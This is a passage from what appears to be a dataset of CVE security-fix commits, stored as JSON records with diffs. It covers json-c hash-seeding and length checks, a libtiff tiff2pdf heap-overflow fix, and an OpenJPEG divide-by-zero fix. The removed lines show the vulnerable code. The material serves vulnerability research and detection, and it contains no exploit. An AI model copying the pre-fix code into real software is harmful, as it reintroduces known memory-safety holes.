unistd.h [sys/cdefs.h] [sys/param.h] stdarg.h locale.h)\n+AC_CHECK_HEADERS(fcntl.h limits.h strings.h syslog.h unistd.h [sys/cdefs.h] [sys/param.h] stdarg.h locale.h endian.h)\n AC_CHECK_HEADER(inttypes.h,[AC_DEFINE([JSON_C_HAVE_INTTYPES_H],[1],[Public define for json_inttypes.h])])\n \n # Checks for typedefs, structures, and compiler characteristics.\ndiff --git a/json_object.h b/json_object.h\nindex 100573471d..200ac4031d 100644\n--- a/json_object.h\n+++ b/json_object.h\n@@ -13,6 +13,14 @@\n #ifndef _json_object_h_\n #define _json_object_h_\n \n+#ifdef __GNUC__\n+#define THIS_FUNCTION_IS_DEPRECATED(func) func __attribute__ ((deprecated))\n+#elif defined(_MSC_VER)\n+#define THIS_FUNCTION_IS_DEPRECATED(func) __declspec(deprecated) func\n+#else\n+#define THIS_FUNCTION_IS_DEPRECATED(func) func\n+#endif\n+\n #include \"json_inttypes.h\"\n \n #ifdef __cplusplus\n@@ -279,8 +287,8 @@ extern void json_object_object_add(struct json_object* obj, const char *key,\n  * @returns the json_object associated with the given field name\n  * @deprecated Please use json_object_object_get_ex\n  */\n-extern struct json_object* json_object_object_get(struct json_object* obj,\n-\t\t\t\t\t\t  const char *key);\n+THIS_FUNCTION_IS_DEPRECATED(extern struct json_object* json_object_object_get(struct json_object* obj,\n+\t\t\t\t\t\t  const char *key));\n \n /** Get the json_object associated with a given object field.  \n  *\ndiff --git a/json_tokener.c b/json_tokener.c\nindex a1019c0a75..19de8efc7a 100644\n--- a/json_tokener.c\n+++ b/json_tokener.c\n@@ -81,6 +81,7 @@ static const char* json_tokener_errors[] = {\n   \"object value separator ',' expected\",\n   \"invalid string sequence\",\n   \"expected comment\",\n+  \"buffer size overflow\"\n };\n \n const char *json_tokener_error_desc(enum json_tokener_error jerr)\n@@ -243,6 +244,16 @@ struct json_object* json_tokener_parse_ex(struct json_tokener *tok,\n   tok->char_offset = 0;\n   tok->err = json_tokener_success;\n \n+  /* this interface is presently not 64-bit clean due to the int len argument\n+     and the internal printbuf interface that takes 32-bit int len arguments\n+     so the function limits the maximum string size to INT32_MAX (2GB).\n+     If the function is called with len == -1 then strlen is called to check\n+     the string length is less than INT32_MAX (2GB) */\n+  if ((len < -1) || (len == -1 && strlen(str) > INT32_MAX)) {\n+    tok->err = json_tokener_error_size;\n+    return NULL;\n+  }\n+\n   while (PEEK_CHAR(c, tok)) {\n \n   redo_char:\ndiff --git a/json_tokener.h b/json_tokener.h\nindex 5471d97c45..a72d2bdefe 100644\n--- a/json_tokener.h\n+++ b/json_tokener.h\n@@ -33,7 +33,8 @@ enum json_tokener_error {\n   json_tokener_error_parse_object_key_sep,\n   json_tokener_error_parse_object_value_sep,\n   json_tokener_error_parse_string,\n-  json_tokener_error_parse_comment\n+  json_tokener_error_parse_comment,\n+  json_tokener_error_size\n };\n \n enum json_tokener_state {\n@@ -163,6 +164,11 @@ extern void json_tokener_set_flags(struct json_tokener *tok, int flags);\n  * responsible for calling json_tokener_parse_ex with an appropriate str\n  * parameter starting with the extra characters.\n  *\n+ * This interface is presently not 64-bit clean due to the int len argument\n+ * so the function limits the maximum string size to INT32_MAX (2GB).\n+ * If the function is called with len == -1 then strlen is called to check\n+ * the string length is less than INT32_MAX (2GB)\n+ *\n  * Example:\n  * @code\n json_object *jobj = NULL;\ndiff --git a/linkhash.c b/linkhash.c\nindex 50431485e9..712c3879e7 100644\n--- a/linkhash.c\n+++ b/linkhash.c\n@@ -17,6 +17,11 @@\n #include <stddef.h>\n #include <limits.h>\n \n+#ifdef HAVE_ENDIAN_H\n+# include <endian.h>    /* attempt to define endianness */\n+#endif\n+\n+#include \"random_seed.h\"\n #include \"linkhash.h\"\n \n void lh_abort(const char *msg, ...)\n@@ -39,14 +44,378 @@ int lh_ptr_equal(const void *k1, const void *k2)\n \treturn (k1 == k2);\n }\n \n+/* \n+ * hashlittle from lookup3.c, by Bob Jenkins, May 2006, Public Domain.\n+ * http://burtleburtle.net/bob/c/lookup3.c\n+ * minor modifications to make functions static so no symbols are exported\n+ * minor mofifications to compile with -Werror\n+ */\n+\n+/*\n+-------------------------------------------------------------------------------\n+lookup3.c, by Bob Jenkins, May 2006, Public Domain.\n+\n+These are functions for producing 32-bit hashes for hash table lookup.\n+hashword(), hashlittle(), hashlittle2(), hashbig(), mix(), and final() \n+are externally useful functions.  Routines to test the hash are included \n+if SELF_TEST is defined.  You can use this free for any purpose.  It's in\n+the public domain.  It has no warranty.\n+\n+You probably want to use hashlittle().  hashlittle() and hashbig()\n+hash byte arrays.  hashlittle() is is faster than hashbig() on\n+little-endian machines.  Intel and AMD are little-endian machines.\n+On second thought, you probably want hashlittle2(), which is identical to\n+hashlittle() except it returns two 32-bit hashes for the price of one.  \n+You could implement hashbig2() if you wanted but I haven't bothered here.\n+\n+If you want to find a hash of, say, exactly 7 integers, do\n+  a = i1;  b = i2;  c = i3;\n+  mix(a,b,c);\n+  a += i4; b += i5; c += i6;\n+  mix(a,b,c);\n+  a += i7;\n+  final(a,b,c);\n+then use c as the hash value.  If you have a variable length array of\n+4-byte integers to hash, use hashword().  If you have a byte array (like\n+a character string), use hashlittle().  If you have several byte arrays, or\n+a mix of things, see the comments above hashlittle().  \n+\n+Why is this so big?  I read 12 bytes at a time into 3 4-byte integers, \n+then mix those integers.  This is fast (you can do a lot more thorough\n+mixing with 12*3 instructions on 3 integers than you can with 3 instructions\n+on 1 byte), but shoehorning those bytes into integers efficiently is messy.\n+-------------------------------------------------------------------------------\n+*/\n+\n+/*\n+ * My best guess at if you are big-endian or little-endian.  This may\n+ * need adjustment.\n+ */\n+#if (defined(__BYTE_ORDER) && defined(__LITTLE_ENDIAN) && \\\n+     __BYTE_ORDER == __LITTLE_ENDIAN) || \\\n+    (defined(i386) || defined(__i386__) || defined(__i486__) || \\\n+     defined(__i586__) || defined(__i686__) || defined(vax) || defined(MIPSEL))\n+# define HASH_LITTLE_ENDIAN 1\n+# define HASH_BIG_ENDIAN 0\n+#elif (defined(__BYTE_ORDER) && defined(__BIG_ENDIAN) && \\\n+       __BYTE_ORDER == __BIG_ENDIAN) || \\\n+      (defined(sparc) || defined(POWERPC) || defined(mc68000) || defined(sel))\n+# define HASH_LITTLE_ENDIAN 0\n+# define HASH_BIG_ENDIAN 1\n+#else\n+# define HASH_LITTLE_ENDIAN 0\n+# define HASH_BIG_ENDIAN 0\n+#endif\n+\n+#define hashsize(n) ((uint32_t)1<<(n))\n+#define hashmask(n) (hashsize(n)-1)\n+#define rot(x,k) (((x)<<(k)) | ((x)>>(32-(k))))\n+\n+/*\n+-------------------------------------------------------------------------------\n+mix -- mix 3 32-bit values reversibly.\n+\n+This is reversible, so any information in (a,b,c) before mix() is\n+still in (a,b,c) after mix().\n+\n+If four pairs of (a,b,c) inputs are run through mix(), or through\n+mix() in reverse, there are at least 32 bits of the output that\n+are sometimes the same for one pair and different for another pair.\n+This was tested for:\n+* pairs that differed by one bit, by two bits, in any combination\n+  of top bits of (a,b,c), or in any combination of bottom bits of\n+  (a,b,c).\n+* \"differ\" is defined as +, -, ^, or ~^.  For + and -, I transformed\n+  the output delta to a Gray code (a^(a>>1)) so a string of 1's (as\n+  is commonly produced by subtraction) look like a single 1-bit\n+  difference.\n+* the base values were pseudorandom, all zero but one bit set, or \n+  all zero plus a counter that starts at zero.\n+\n+Some k values for my \"a-=c; a^=rot(c,k); c+=b;\" arrangement that\n+satisfy this are\n+    4  6  8 16 19  4\n+    9 15  3 18 27 15\n+   14  9  3  7 17  3\n+Well, \"9 15 3 18 27 15\" didn't quite get 32 bits diffing\n+for \"differ\" defined as + with a one-bit base and a two-bit delta.  I\n+used http://burtleburtle.net/bob/hash/avalanche.html to choose \n+the operations, constants, and arrangements of the variables.\n+\n+This does not achieve avalanche.  There are input bits of (a,b,c)\n+that fail to affect some output bits of (a,b,c), especially of a.  The\n+most thoroughly mixed value is c, but it doesn't really even achieve\n+avalanche in c.\n+\n+This allows some parallelism.  Read-after-writes are good at doubling\n+the number of bits affected, so the goal of mixing pulls in the opposite\n+direction as the goal of parallelism.  I did what I could.  Rotates\n+seem to cost as much as shifts on every machine I could lay my hands\n+on, and rotates are much kinder to the top and bottom bits, so I used\n+rotates.\n+-------------------------------------------------------------------------------\n+*/\n+#define mix(a,b,c) \\\n+{ \\\n+  a -= c;  a ^= rot(c, 4);  c += b; \\\n+  b -= a;  b ^= rot(a, 6);  a += c; \\\n+  c -= b;  c ^= rot(b, 8);  b += a; \\\n+  a -= c;  a ^= rot(c,16);  c += b; \\\n+  b -= a;  b ^= rot(a,19);  a += c; \\\n+  c -= b;  c ^= rot(b, 4);  b += a; \\\n+}\n+\n+/*\n+-------------------------------------------------------------------------------\n+final -- final mixing of 3 32-bit values (a,b,c) into c\n+\n+Pairs of (a,b,c) values differing in only a few bits will usually\n+produce values of c that look totally different.  This was tested for\n+* pairs that differed by one bit, by two bits, in any combination\n+  of top bits of (a,b,c), or in any combination of bottom bits of\n+  (a,b,c).\n+* \"differ\" is defined as +, -, ^, or ~^.  For + and -, I transformed\n+  the output delta to a Gray code (a^(a>>1)) so a string of 1's (as\n+  is commonly produced by subtraction) look like a single 1-bit\n+  difference.\n+* the base values were pseudorandom, all zero but one bit set, or \n+  all zero plus a counter that starts at zero.\n+\n+These constants passed:\n+ 14 11 25 16 4 14 24\n+ 12 14 25 16 4 14 24\n+and these came close:\n+  4  8 15 26 3 22 24\n+ 10  8 15 26 3 22 24\n+ 11  8 15 26 3 22 24\n+-------------------------------------------------------------------------------\n+*/\n+#define final(a,b,c) \\\n+{ \\\n+  c ^= b; c -= rot(b,14); \\\n+  a ^= c; a -= rot(c,11); \\\n+  b ^= a; b -= rot(a,25); \\\n+  c ^= b; c -= rot(b,16); \\\n+  a ^= c; a -= rot(c,4);  \\\n+  b ^= a; b -= rot(a,14); \\\n+  c ^= b; c -= rot(b,24); \\\n+}\n+\n+\n+/*\n+-------------------------------------------------------------------------------\n+hashlittle() -- hash a variable-length key into a 32-bit value\n+  k       : the key (the unaligned variable-length array of bytes)\n+  length  : the length of the key, counting by bytes\n+  initval : can be any 4-byte value\n+Returns a 32-bit value.  Every bit of the key affects every bit of\n+the return value.  Two keys differing by one or two bits will have\n+totally different hash values.\n+\n+The best hash table sizes are powers of 2.  There is no need to do\n+mod a prime (mod is sooo slow!).  If you need less than 32 bits,\n+use a bitmask.  For example, if you need only 10 bits, do\n+  h = (h & hashmask(10));\n+In which case, the hash table should have hashsize(10) elements.\n+\n+If you are hashing n strings (uint8_t **)k, do it like this:\n+  for (i=0, h=0; i<n; ++i) h = hashlittle( k[i], len[i], h);\n+\n+By Bob Jenkins, 2006.  bob_jenkins@burtleburtle.net.  You may use this\n+code any way you wish, private, educational, or commercial.  It's free.\n+\n+Use for hash table lookup, or anything where one collision in 2^^32 is\n+acceptable.  Do NOT use for cryptographic purposes.\n+-------------------------------------------------------------------------------\n+*/\n+\n+static uint32_t hashlittle( const void *key, size_t length, uint32_t initval)\n+{\n+  uint32_t a,b,c;                                          /* internal state */\n+  union { const void *ptr; size_t i; } u;     /* needed for Mac Powerbook G4 */\n+\n+  /* Set up the internal state */\n+  a = b = c = 0xdeadbeef + ((uint32_t)length) + initval;\n+\n+  u.ptr = key;\n+  if (HASH_LITTLE_ENDIAN && ((u.i & 0x3) == 0)) {\n+    const uint32_t *k = (const uint32_t *)key;         /* read 32-bit chunks */\n+\n+    /*------ all but last block: aligned reads and affect 32 bits of (a,b,c) */\n+    while (length > 12)\n+    {\n+      a += k[0];\n+      b += k[1];\n+      c += k[2];\n+      mix(a,b,c);\n+      length -= 12;\n+      k += 3;\n+    }\n+\n+    /*----------------------------- handle the last (probably partial) block */\n+    /* \n+     * \"k[2]&0xffffff\" actually reads beyond the end of the string, but\n+     * then masks off the part it's not allowed to read.  Because the\n+     * string is aligned, the masked-off tail is in the same word as the\n+     * rest of the string.  Every machine with memory protection I've seen\n+     * does it on word boundaries, so is OK with this.  But VALGRIND will\n+     * still catch it and complain.  The masking trick does make the hash\n+     * noticably faster for short strings (like English words).\n+     */\n+#ifndef VALGRIND\n+\n+    switch(length)\n+    {\n+    case 12: c+=k[2]; b+=k[1]; a+=k[0]; break;\n+    case 11: c+=k[2]&0xffffff; b+=k[1]; a+=k[0]; break;\n+    case 10: c+=k[2]&0xffff; b+=k[1]; a+=k[0]; break;\n+    case 9 : c+=k[2]&0xff; b+=k[1]; a+=k[0]; break;\n+    case 8 : b+=k[1]; a+=k[0]; break;\n+    case 7 : b+=k[1]&0xffffff; a+=k[0]; break;\n+    case 6 : b+=k[1]&0xffff; a+=k[0]; break;\n+    case 5 : b+=k[1]&0xff; a+=k[0]; break;\n+    case 4 : a+=k[0]; break;\n+    case 3 : a+=k[0]&0xffffff; break;\n+    case 2 : a+=k[0]&0xffff; break;\n+    case 1 : a+=k[0]&0xff; break;\n+    case 0 : return c;              /* zero length strings require no mixing */\n+    }\n+\n+#else /* make valgrind happy */\n+\n+    const uint8_t  *k8 = (const uint8_t *)k;\n+    switch(length)\n+    {\n+    case 12: c+=k[2]; b+=k[1]; a+=k[0]; break;\n+    case 11: c+=((uint32_t)k8[10])<<16;  /* fall through */\n+    case 10: c+=((uint32_t)k8[9])<<8;    /* fall through */\n+    case 9 : c+=k8[8];                   /* fall through */\n+    case 8 : b+=k[1]; a+=k[0]; break;\n+    case 7 : b+=((uint32_t)k8[6])<<16;   /* fall through */\n+    case 6 : b+=((uint32_t)k8[5])<<8;    /* fall through */\n+    case 5 : b+=k8[4];                   /* fall through */\n+    case 4 : a+=k[0]; break;\n+    case 3 : a+=((uint32_t)k8[2])<<16;   /* fall through */\n+    case 2 : a+=((uint32_t)k8[1])<<8;    /* fall through */\n+    case 1 : a+=k8[0]; break;\n+    case 0 : return c;\n+    }\n+\n+#endif /* !valgrind */\n+\n+  } else if (HASH_LITTLE_ENDIAN && ((u.i & 0x1) == 0)) {\n+    const uint16_t *k = (const uint16_t *)key;         /* read 16-bit chunks */\n+    const uint8_t  *k8;\n+\n+    /*--------------- all but last block: aligned reads and different mixing */\n+    while (length > 12)\n+    {\n+      a += k[0] + (((uint32_t)k[1])<<16);\n+      b += k[2] + (((uint32_t)k[3])<<16);\n+      c += k[4] + (((uint32_t)k[5])<<16);\n+      mix(a,b,c);\n+      length -= 12;\n+      k += 6;\n+    }\n+\n+    /*----------------------------- handle the last (probably partial) block */\n+    k8 = (const uint8_t *)k;\n+    switch(length)\n+    {\n+    case 12: c+=k[4]+(((uint32_t)k[5])<<16);\n+             b+=k[2]+(((uint32_t)k[3])<<16);\n+             a+=k[0]+(((uint32_t)k[1])<<16);\n+             break;\n+    case 11: c+=((uint32_t)k8[10])<<16;     /* fall through */\n+    case 10: c+=k[4];\n+             b+=k[2]+(((uint32_t)k[3])<<16);\n+             a+=k[0]+(((uint32_t)k[1])<<16);\n+             break;\n+    case 9 : c+=k8[8];                      /* fall through */\n+    case 8 : b+=k[2]+(((uint32_t)k[3])<<16);\n+             a+=k[0]+(((uint32_t)k[1])<<16);\n+             break;\n+    case 7 : b+=((uint32_t)k8[6])<<16;      /* fall through */\n+    case 6 : b+=k[2];\n+             a+=k[0]+(((uint32_t)k[1])<<16);\n+             break;\n+    case 5 : b+=k8[4];                      /* fall through */\n+    case 4 : a+=k[0]+(((uint32_t)k[1])<<16);\n+             break;\n+    case 3 : a+=((uint32_t)k8[2])<<16;      /* fall through */\n+    case 2 : a+=k[0];\n+             break;\n+    case 1 : a+=k8[0];\n+             break;\n+    case 0 : return c;                     /* zero length requires no mixing */\n+    }\n+\n+  } else {                        /* need to read the key one byte at a time */\n+    const uint8_t *k = (const uint8_t *)key;\n+\n+    /*--------------- all but the last block: affect some 32 bits of (a,b,c) */\n+    while (length > 12)\n+    {\n+      a += k[0];\n+      a += ((uint32_t)k[1])<<8;\n+      a += ((uint32_t)k[2])<<16;\n+      a += ((uint32_t)k[3])<<24;\n+      b += k[4];\n+      b += ((uint32_t)k[5])<<8;\n+      b += ((uint32_t)k[6])<<16;\n+      b += ((uint32_t)k[7])<<24;\n+      c += k[8];\n+      c += ((uint32_t)k[9])<<8;\n+      c += ((uint32_t)k[10])<<16;\n+      c += ((uint32_t)k[11])<<24;\n+      mix(a,b,c);\n+      length -= 12;\n+      k += 12;\n+    }\n+\n+    /*-------------------------------- last block: affect all 32 bits of (c) */\n+    switch(length)                   /* all the case statements fall through */\n+    {\n+    case 12: c+=((uint32_t)k[11])<<24;\n+    case 11: c+=((uint32_t)k[10])<<16;\n+    case 10: c+=((uint32_t)k[9])<<8;\n+    case 9 : c+=k[8];\n+    case 8 : b+=((uint32_t)k[7])<<24;\n+    case 7 : b+=((uint32_t)k[6])<<16;\n+    case 6 : b+=((uint32_t)k[5])<<8;\n+    case 5 : b+=k[4];\n+    case 4 : a+=((uint32_t)k[3])<<24;\n+    case 3 : a+=((uint32_t)k[2])<<16;\n+    case 2 : a+=((uint32_t)k[1])<<8;\n+    case 1 : a+=k[0];\n+             break;\n+    case 0 : return c;\n+    }\n+  }\n+\n+  final(a,b,c);\n+  return c;\n+}\n+\n unsigned long lh_char_hash(const void *k)\n {\n-\tunsigned int h = 0;\n-\tconst char* data = (const char*)k;\n- \n-\twhile( *data!=0 ) h = h*129 + (unsigned int)(*data++) + LH_PRIME;\n+\tstatic volatile int random_seed = -1;\n+\n+\tif (random_seed == -1) {\n+\t\tint seed;\n+\t\t/* we can't use -1 as it is the unitialized sentinel */\n+\t\twhile ((seed = json_c_get_random_seed()) == -1);\n+#if defined __GNUC__\n+\t\t__sync_val_compare_and_swap(&random_seed, -1, seed);\n+#elif defined _MSC_VER\n+\t\tInterlockedCompareExchange(&random_seed, seed, -1);\n+#else\n+#warning \"racy random seed initializtion if used by multiple threads\"\n+\t\trandom_seed = seed; /* potentially racy */\n+#endif\n+\t}\n \n-\treturn h;\n+\treturn hashlittle((const char*)k, strlen((const char*)k), random_seed); \n }\n \n int lh_char_equal(const void *k1, const void *k2)\ndiff --git a/linkhash.h b/linkhash.h\nindex 378de0b76c..950d09f35d 100644\n--- a/linkhash.h\n+++ b/linkhash.h\n@@ -246,7 +246,7 @@ extern struct lh_entry* lh_table_lookup_entry(struct lh_table *t, const void *k)\n  * @return a pointer to the found value or NULL if it does not exist.\n  * @deprecated Use lh_table_lookup_ex instead.\n  */\n-extern const void* lh_table_lookup(struct lh_table *t, const void *k);\n+THIS_FUNCTION_IS_DEPRECATED(extern const void* lh_table_lookup(struct lh_table *t, const void *k));\n \n /**\n  * Lookup a record in the table\ndiff --git a/random_seed.c b/random_seed.c\nnew file mode 100644\nindex 0000000000..3b520d411e\n--- /dev/null\n+++ b/random_seed.c\n@@ -0,0 +1,237 @@\n+/*\n+ * random_seed.c\n+ *\n+ * Copyright (c) 2013 Metaparadigm Pte. Ltd.\n+ * Michael Clark <michael@metaparadigm.com>\n+ *\n+ * This library is free software; you can redistribute it and/or modify\n+ * it under the terms of the MIT license. See COPYING for details.\n+ *\n+ */\n+\n+#include <stdio.h>\n+#include \"config.h\"\n+\n+#define DEBUG_SEED(s)\n+\n+\n+#if defined ENABLE_RDRAND\n+\n+/* cpuid */\n+\n+#if defined __GNUC__ && (defined __i386__ || defined __x86_64__)\n+#define HAS_X86_CPUID 1\n+\n+static void do_cpuid(int regs[], int h)\n+{\n+    __asm__ __volatile__(\n+#if defined __x86_64__\n+                         \"pushq %%rbx;\\n\"\n+#else\n+                         \"pushl %%ebx;\\n\"\n+#endif\n+                         \"cpuid;\\n\"\n+#if defined __x86_64__\n+                         \"popq %%rbx;\\n\"\n+#else\n+                         \"popl %%ebx;\\n\"\n+#endif\n+                         : \"=a\"(regs[0]), [ebx] \"=r\"(regs[1]), \"=c\"(regs[2]), \"=d\"(regs[3])\n+                         : \"a\"(h));\n+}\n+\n+#elif defined _MSC_VER\n+\n+#define HAS_X86_CPUID 1\n+#define do_cpuid __cpuid\n+\n+#endif\n+\n+/* has_rdrand */\n+\n+#if HAS_X86_CPUID\n+\n+static int has_rdrand()\n+{\n+    // CPUID.01H:ECX.RDRAND[bit 30] == 1\n+    int regs[4];\n+    do_cpuid(regs, 1);\n+    return (regs[2] & (1 << 30)) != 0;\n+}\n+\n+#endif\n+\n+/* get_rdrand_seed - GCC x86 and X64 */\n+\n+#if defined __GNUC__ && (defined __i386__ || defined __x86_64__)\n+\n+#define HAVE_RDRAND 1\n+\n+static int get_rdrand_seed()\n+{\n+    DEBUG_SEED(\"get_rdrand_seed\");\n+    int _eax;\n+    // rdrand eax\n+    __asm__ __volatile__(\"1: .byte 0x0F\\n\"\n+                         \"   .byte 0xC7\\n\"\n+                         \"   .byte 0xF0\\n\"\n+                         \"   jnc 1b;\\n\"\n+                         : \"=a\" (_eax));\n+    return _eax;\n+}\n+\n+#endif\n+\n+#if defined _MSC_VER\n+\n+#if _MSC_VER >= 1700\n+#define HAVE_RDRAND 1\n+\n+/* get_rdrand_seed - Visual Studio 2012 and above */\n+\n+static int get_rdrand_seed()\n+{\n+    DEBUG_SEED(\"get_rdrand_seed\");\n+    int r;\n+    while (_rdrand32_step(&r) == 0);\n+    return r;\n+}\n+\n+#elif defined _M_IX86\n+#define HAVE_RDRAND 1\n+\n+/* get_rdrand_seed - Visual Studio 2010 and below - x86 only */\n+\n+static int get_rdrand_seed()\n+{\n+\tDEBUG_SEED(\"get_rdrand_seed\");\n+\tint _eax;\n+retry:\n+\t// rdrand eax\n+\t__asm _emit 0x0F __asm _emit 0xC7 __asm _emit 0xF0\n+\t__asm jnc retry\n+\t__asm mov _eax, eax\n+\treturn _eax;\n+}\n+\n+#endif\n+#endif\n+\n+#endif /* defined ENABLE_RDRAND */\n+\n+\n+/* has_dev_urandom */\n+\n+#if defined (__APPLE__) || defined(__unix__) || defined(__linux__)\n+\n+#include <string.h>\n+#include <fcntl.h>\n+#include <unistd.h>\n+#include <errno.h>\n+#include <stdlib.h>\n+#include <sys/stat.h>\n+\n+#define HAVE_DEV_RANDOM 1\n+\n+static const char *dev_random_file = \"/dev/urandom\";\n+\n+static int has_dev_urandom()\n+{\n+    struct stat buf;\n+    if (stat(dev_random_file, &buf)) {\n+        return 0;\n+    }\n+    return ((buf.st_mode & S_IFCHR) != 0);\n+}\n+\n+\n+/* get_dev_random_seed */\n+\n+static int get_dev_random_seed()\n+{\n+    DEBUG_SEED(\"get_dev_random_seed\");\n+    \n+    int fd = open(dev_random_file, O_RDONLY);\n+    if (fd < 0) {\n+        fprintf(stderr, \"error opening %s: %s\", dev_random_file, strerror(errno));\n+        exit(1);\n+    }\n+    \n+    int r;\n+    ssize_t nread = read(fd, &r, sizeof(r));\n+    if (nread != sizeof(r)) {\n+        fprintf(stderr, \"error read %s: %s\", dev_random_file, strerror(errno));\n+        exit(1);\n+    }\n+    else if (nread != sizeof(r)) {\n+        fprintf(stderr, \"error short read %s\", dev_random_file);\n+        exit(1);\n+    }\n+    close(fd);\n+    return r;\n+}\n+\n+#endif\n+\n+\n+/* get_cryptgenrandom_seed */\n+\n+#ifdef WIN32\n+\n+#define HAVE_CRYPTGENRANDOM 1\n+\n+#include <windows.h>\n+#pragma comment(lib, \"advapi32.lib\")\n+\n+static int get_cryptgenrandom_seed()\n+{\n+    DEBUG_SEED(\"get_cryptgenrandom_seed\");\n+    \n+    HCRYPTPROV hProvider = 0;\n+    int r;\n+    \n+    if (!CryptAcquireContextW(&hProvider, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) {\n+        fprintf(stderr, \"error CryptAcquireContextW\");\n+        exit(1);\n+    }\n+    \n+    if (!CryptGenRandom(hProvider, sizeof(r), (BYTE*)&r)) {\n+        fprintf(stderr, \"error CryptGenRandom\");\n+        exit(1);\n+    }\n+    \n+    CryptReleaseContext(hProvider, 0);\n+    \n+    return r;\n+}\n+\n+#endif\n+\n+\n+/* get_time_seed */\n+\n+#include <time.h>\n+\n+static int get_time_seed()\n+{\n+    DEBUG_SEED(\"get_time_seed\");\n+    \n+    return (int)time(NULL) * 433494437;\n+}\n+\n+\n+/* json_c_get_random_seed */\n+\n+int json_c_get_random_seed()\n+{\n+#if HAVE_RDRAND\n+    if (has_rdrand()) return get_rdrand_seed();\n+#endif\n+#if HAVE_DEV_RANDOM\n+    if (has_dev_urandom()) return get_dev_random_seed();\n+#endif\n+#if HAVE_CRYPTGENRANDOM\n+    return get_cryptgenrandom_seed();\n+#endif\n+    return get_time_seed();\n+}\ndiff --git a/random_seed.h b/random_seed.h\nnew file mode 100644\nindex 0000000000..7362d67d9c\n--- /dev/null\n+++ b/random_seed.h\n@@ -0,0 +1,25 @@\n+/*\n+ * random_seed.h\n+ *\n+ * Copyright (c) 2013 Metaparadigm Pte. Ltd.\n+ * Michael Clark <michael@metaparadigm.com>\n+ *\n+ * This library is free software; you can redistribute it and/or modify\n+ * it under the terms of the MIT license. See COPYING for details.\n+ *\n+ */\n+\n+#ifndef seed_h\n+#define seed_h\n+\n+#ifdef __cplusplus\n+extern \"C\" {\n+#endif\n+\n+extern int json_c_get_random_seed();\n+\n+#ifdef __cplusplus\n+}\n+#endif\n+\n+#endif\n", "owner": "json-c", "repo": "json-c", "source": "cve"}
{"CVE_ID": "CVE-2016-10094", "CWE_ID": "189", "category": "security", "commit_id": "c7153361a4041260719b340f73f2f76b0969235c", "commit_message": "From c7153361a4041260719b340f73f2f76b0969235c Mon Sep 17 00:00:00 2001\nFrom: erouault <erouault>\nDate: Tue, 20 Dec 2016 17:28:17 +0000\nSubject: [PATCH] * tools/tiff2pdf.c: avoid potential heap-based overflow in\n t2p_readwrite_pdf_image_tile(). Fixes\n http://bugzilla.maptools.org/show_bug.cgi?id=2640\n\n---\n ChangeLog        | 6 ++++++\n tools/tiff2pdf.c | 2 +-\n 2 files changed, 7 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/ChangeLog b/ChangeLog\nindex 6be36026..91ba4e6e 100644\n--- a/ChangeLog\n+++ b/ChangeLog\n@@ -1,3 +1,9 @@\n+2016-12-20 Even Rouault <even.rouault at spatialys.com>\n+\n+\t* tools/tiff2pdf.c: avoid potential heap-based overflow in\n+\tt2p_readwrite_pdf_image_tile().\n+\tFixes http://bugzilla.maptools.org/show_bug.cgi?id=2640\n+\n 2016-12-20 Even Rouault <even.rouault at spatialys.com>\n \n \t* tools/tiff2pdf.c: avoid potential invalid memory read in\ndiff --git a/tools/tiff2pdf.c b/tools/tiff2pdf.c\nindex 47d76298..db196e04 100644\n--- a/tools/tiff2pdf.c\n+++ b/tools/tiff2pdf.c\n@@ -2895,7 +2895,7 @@ tsize_t t2p_readwrite_pdf_image_tile(T2P* t2p, TIFF* input, TIFF* output, ttile_\n \t\t\t\treturn(0);\n \t\t\t}\n \t\t\tif(TIFFGetField(input, TIFFTAG_JPEGTABLES, &count, &jpt) != 0) {\n-\t\t\t\tif (count >= 4) {\n+\t\t\t\tif (count > 4) {\n                                         int retTIFFReadRawTile;\n                     /* Ignore EOI marker of JpegTables */\n \t\t\t\t\t_TIFFmemcpy(buffer, jpt, count - 2);\n", "owner": "vadz", "repo": "libtiff", "source": "cve"}
{"CVE_ID": "CVE-2016-10506", "CWE_ID": "369", "category": "security", "commit_id": "d27ccf01c68a31ad62b33d2dc1ba2bb1eeaafe7b", "commit_message": "From d27ccf01c68a31ad62b33d2dc1ba2bb1eeaafe7b Mon Sep 17 00:00:00 2001\nFrom: Even Rouault <even.rouault@spatialys.com>\nDate: Wed, 26 Jul 2017 11:30:56 +0200\nSubject: [PATCH] Avoid division by zero in opj_pi_next_rpcl, opj_pi_next_pcrl\n and opj_pi_next_cprl (#938)\n\nFixes issues with id:000026,sig:08,src:002419,op:int32,pos:60,val:+32 and\nid:000019,sig:08,src:001098,op:flip1,pos:49\n---\n src/lib/openjp2/pi.c | 33 +++++++++++++++++++++++++++++++++\n 1 file changed, 33 insertions(+)\n\n", "diff_code": "diff --git a/src/lib/openjp2/pi.c b/src/lib/openjp2/pi.c\nindex c1724fd6d..798867a80 100644\n--- a/src/lib/openjp2/pi.c\n+++ b/src/lib/openjp2/pi.c\n@@ -369,6 +369,17 @@ static OPJ_BOOL opj_pi_next_rpcl(opj_pi_iterator_t * pi)\n                     try1 = opj_int_ceildiv(pi->ty1, (OPJ_INT32)(comp->dy << levelno));\n                     rpx = res->pdx + levelno;\n                     rpy = res->pdy + levelno;\n+\n+                    /* To avoid divisions by zero / undefined behaviour on shift */\n+                    /* in below tests */\n+                    /* Fixes reading id:000026,sig:08,src:002419,op:int32,pos:60,val:+32 */\n+                    /* of https://github.com/uclouvain/openjpeg/issues/938 */\n+                    if (rpx >= 31 || ((comp->dx << rpx) >> rpx) != comp->dx ||\n+                            rpy >= 31 || ((comp->dy << rpy) >> rpy) != comp->dy) {\n+                        continue;\n+                    }\n+\n+                    /* See ISO-15441. B.12.1.3 Resolution level-position-component-layer progression */\n                     if (!((pi->y % (OPJ_INT32)(comp->dy << rpy) == 0) || ((pi->y == pi->ty0) &&\n                             ((try0 << levelno) % (1 << rpy))))) {\n                         continue;\n@@ -464,6 +475,17 @@ static OPJ_BOOL opj_pi_next_pcrl(opj_pi_iterator_t * pi)\n                     try1 = opj_int_ceildiv(pi->ty1, (OPJ_INT32)(comp->dy << levelno));\n                     rpx = res->pdx + levelno;\n                     rpy = res->pdy + levelno;\n+\n+                    /* To avoid divisions by zero / undefined behaviour on shift */\n+                    /* in below tests */\n+                    /* Relates to id:000019,sig:08,src:001098,op:flip1,pos:49 */\n+                    /* of https://github.com/uclouvain/openjpeg/issues/938 */\n+                    if (rpx >= 31 || ((comp->dx << rpx) >> rpx) != comp->dx ||\n+                            rpy >= 31 || ((comp->dy << rpy) >> rpy) != 